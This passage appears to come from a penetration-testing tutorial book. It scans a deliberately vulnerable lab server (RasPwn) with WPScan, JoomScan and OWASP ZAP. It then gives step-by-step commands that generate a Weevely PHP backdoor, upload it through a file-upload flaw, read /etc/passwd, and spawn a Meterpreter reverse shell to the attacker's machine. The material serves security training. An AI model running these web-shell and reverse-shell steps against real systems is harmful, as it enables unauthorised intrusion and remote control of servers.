    This will find a lot of code vulnerabilities:


    ![](images/00179.gif)


    Again, this will take forever to run on the RPi – I let it run all day and night
    and it was still going. You can cancel it out with `Ctrl-c` when you want. Though
    it is good to know that `Sn1per` does have this capability.


    In the previous `Sn1per` `Web` scan, we found multiple web apps running on the
    server. `WordPress` & `Joomla` were detected, so let’s target these two with specialized
    tools that are in Kali Linux. `WPScan`, which we covered previously, and `JoomScan`.


    ### Scanning RasPwn with WPScan


    ![](images/00180.gif)


    Tool Author: `WPScan Team`


    Tool Website: [https://sucuri.net](https://sucuri.net)


    Let’s perform an aggressive scan against the WordPress v4 install on RasPwn:


    ```

    wpscan --url 192.168.99.13/wordpress4 --detection-mode aggressive

    ```


    And the result:


    ![](images/00181.jpeg)


    63 vulnerabilities! If you want, you can go after them, the references provided
    give you information on the vulnerability and possible ways to exploit them. Have
    fun! If you want you could also scan the `wordpress3` install on the same server.


    Next, let’s scan the Joomla installs for vulnerabilities.


    ### Scanning for Joomla Vulnerabilities with JoomScan


    Tool Website: [https://www.owasp.org/index.php/Category:OWASP_Joomla_Vulnerability_Scanner_Project](https://www.owasp.org/index.php/Category:OWASP_Joomla_Vulnerability_Scanner_Project)


    Tool GitHub Page: [https://github.com/rezasp/joomscan](https://github.com/rezasp/joomscan)


    Scanning RasPwn:


    - In a terminal, enter `joomscan -u 192.168.99.13/joomla-3`


    ![](images/00182.jpeg)


    `JoomScan` checks for a Firewall, detects the Joomla version and then begins the
    vulnerability scan.


    The Results:


    ![](images/00183.jpeg)


    Multiple vulnerabilities are detected. Each one is listed along with the `CVE`
    number and a website link explaining the issue. With this information you could
    then move forward with exploiting the vulnerabilities. A copy of the results can
    be found, stored by IP address, in the program `reports` directory:


    ![](images/00184.jpeg)


    Both HTML and txt versions of the reports are available.


    ### Scanning RasPwn with OWASP ZAP


    Tool GitHub: [https://github.com/zaproxy/zaproxy](https://github.com/zaproxy/zaproxy)


    Tool Wiki: [https://github.com/zaproxy/zaproxy/wiki/Introduction](https://github.com/zaproxy/zaproxy/wiki/Introduction)


    There are numerous web application scanning tools we could use against RasPwn.
    One option is `OWASP ZAP` (Zed Attack Proxy), an easy to use tool for finding
    vulnerabilities in web apps. I cover this utility extensively in my other books,
    and it takes a very long time to run on RasPwn, but it would be a possible option.


    To start OWASP ZAP:


    - In a Kali Terminal, enter `owasp-zap`

    - Accept the license agreement

    - Click, `No don’t want to persist this session`, and then `start`

    - In the URL to attack, enter `http://192.168.99.13/mutillidae`

    - Click, `Attack`


    ![](images/00185.jpeg)


    `OWASP ZAP` then begins to actively scan the web app pages. A live status is displayed
    in the bottom window. Any security issues can be viewed under the `Alerts` tab.
    The alerts are color coded as severity; red is the most concerning.


    Click on any of the `Alerts` to learn more information about the alert, the attack
    used, a description of the attack and possible solutions.


    As seen below:


    ![](images/00186.jpeg)


    You can then try the `attack` against the test website to see the response. Below
    is a demonstration of a path traversal vulnerability. Not as common in web apps
    as it used to be, this vulnerability would allow someone to pull information from
    the webserver using a specially crafted URL. In this instance, the URL includes
    numerous `../../../` followed by the `/etc/passwd` file. When the URL is browsed
    to, it causes the web server to display the server’s user file.


    ![](images/00187.jpeg)


    We covered this before, but take a few minutes and look at the other alerts for
    additional exploitation. Before we wrap up this chapter, let’s take a quick look
    at exploiting a file upload vulnerability in Mutillidae using `Weevely`, the `Weaponized
    Web Shell`.


    ### Weevely3


    Tool GitHub: [https://github.com/epinna/weevely3](https://github.com/epinna/weevely3)


    `Weevely` is a persistent, feature rich remote shell that can perform post exploitation
    tasks. It is also very easy to use - generate a remote shell with `Weevely`, upload
    it to the target webserver, then execute it. Once the shell is active you have
    numerous commands at your disposal to interact with the target system.


    Sometimes vulnerable web servers allow you to upload files to them. This could
    be abused by an attacker to upload a web shell. If the shell is then executed,
    it gives the attacker access to the web server itself. Let’s see how to do this
    against Mutillidae running on RasPwn.


    To generate a php door:


    - In a Kali terminal, enter `weevely generate backdoor.php`


    ![](images/00188.jpeg)


    Now upload the file to our vulnerable test website, RasPwn’s Mutillidae:


    1. From the Web browser in Kali Linux, navigate to the Mutillidae webpage: `http://192.168.99.13/mutillidae/`

    2. From the menu, select: `Others > Unrestricted File Upload > File Upload`

    3. Select the backdoor file that we just created:


    ![](images/00189.jpeg)


    And then click `Upload File`


    ![](images/00190.jpeg)


    Notice the path where the file is stored. Connect to that path with `Weevely`:


    - In the terminal, enter `weevely http://192.168.99.13/mutillidae/index.php?page=/tmp/backdoor.php
    password`


    And we are in!


    ![](images/00191.jpeg)


    - Type `help` for available commands. Any commands that you run will be executed
    on the remote RasPwn box.


    - Type `:system_info`


    ![](images/00192.jpeg)


    Next, check running processes:


    - Enter, `:system_procs`


    ![](images/00193.jpeg)


    Let’s check the user list `passwd` file:


    - Next, type, `:audit_etcpasswd`


    ![](images/00194.jpeg)


    #### Spawning a Secondary Remote Meterpreter Shell


    Some people prefer using a Metploplo Meterpreter shell. We can actually spawn
    a Meterpreter shell from an active `Weevely` shell. This will require us to use
    two Terminal windows in Kali. One for the active `Weevely` shell and one for the
    Metasploit shell. When done, it will look something like this:


    ![](images/00195.jpeg)


    Let’s step through this process:


    1. From the active `Weevely` shell, enter, `:backdoor_meterpreter -lhost [Your
    Kali Linux IP address]`.

    2. The command will then give you a `Msfconsole` command to run in a second Terminal
    Window.

    3. Open a second Terminal window.

    4. Copy and paste the entire `Msfconsole` command into the second Terminal Window,
    and then run it.


    ![](images/00196.jpeg)


    Metasploit is now ready to catch the shell spawn command from `Weevely`.


    5. In the first Terminal, enter the `:backdoor_meterpreter -lhost [Kali IP Address]`
    command again.


    A Meterpreter shell should open in the second terminal:

